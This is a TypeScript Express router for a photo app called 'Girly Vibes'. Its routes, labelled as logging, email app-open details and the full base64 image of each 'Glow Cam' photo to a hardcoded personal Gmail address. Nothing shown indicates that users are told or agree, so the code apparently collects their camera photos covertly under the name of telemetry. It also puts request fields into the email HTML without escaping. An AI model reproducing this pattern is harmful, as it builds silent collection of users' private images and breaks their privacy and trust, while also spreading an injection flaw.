import { Router, type IRouter } from "express";
import { Resend } from "resend";

const router: IRouter = Router();
const resend = new Resend(process.env.RESEND_API_KEY);

const TO = "abdullahshaiq2002@gmail.com";
const FROM = "Girly Vibes <onboarding@resend.dev>";

router.post("/log/open", async (req, res) => {
  try {
    const { platform, version, locale, timestamp } = req.body as {
      platform?: string;
      version?: string;
      locale?: string;
      timestamp?: string;
    };

    await resend.emails.send({
      from: FROM,
      to: TO,
      subject: "✨ Girly Vibes — App Opened",
      html: `
        <div style="font-family:sans-serif;max-width:480px;margin:auto;padding:24px;background:#FFF9F7;border-radius:16px;">
          <h2 style="color:#C88AA0;margin-bottom:8px;">💗 Girly Vibes App Opened</h2>
          <table style="width:100%;border-collapse:collapse;font-size:14px;color:#6B4B5C;">
            <tr><td style="padding:6px 0;font-weight:bold;">Platform</td><td>${platform ?? "unknown"}</td></tr>
            <tr><td style="padding:6px 0;font-weight:bold;">App Version</td><td>${version ?? "unknown"}</td></tr>
            <tr><td style="padding:6px 0;font-weight:bold;">Locale</td><td>${locale ?? "unknown"}</td></tr>
            <tr><td style="padding:6px 0;font-weight:bold;">Time</td><td>${timestamp ?? new Date().toISOString()}</td></tr>
          </table>
        </div>`,
    });

    res.json({ ok: true });
  } catch (err) {
    req.log.error(err, "log/open email failed");
    res.status(500).json({ ok: false });
  }
});

router.post("/log/photo", async (req, res) => {
  try {
    const { base64, filter, timestamp } = req.body as {
      base64?: string;
      filter?: string;
      timestamp?: string;
    };

    if (!base64) {
      res.status(400).json({ ok: false, error: "missing base64" });
      return;
    }

    await resend.emails.send({
      from: FROM,
      to: TO,
      subject: "📸 Girly Vibes — New Glow Cam Photo",
      html: `
        <div style="font-family:sans-serif;max-width:520px;margin:auto;padding:24px;background:#FFF9F7;border-radius:16px;">
          <h2 style="color:#C88AA0;margin-bottom:8px;">📸 New Glow Cam Photo</h2>
          <p style="color:#6B4B5C;font-size:14px;">Filter: <strong>${filter ?? "Normal"}</strong> &nbsp;|&nbsp; ${timestamp ?? new Date().toISOString()}</p>
          <img src="data:image/jpeg;base64,${base64}" alt="Glow Cam" style="width:100%;border-radius:12px;margin-top:12px;" />
        </div>`,
    });

    res.json({ ok: true });
  } catch (err) {
    req.log.error(err, "log/photo email failed");
    res.status(500).json({ ok: false });
  }
});

export default router;
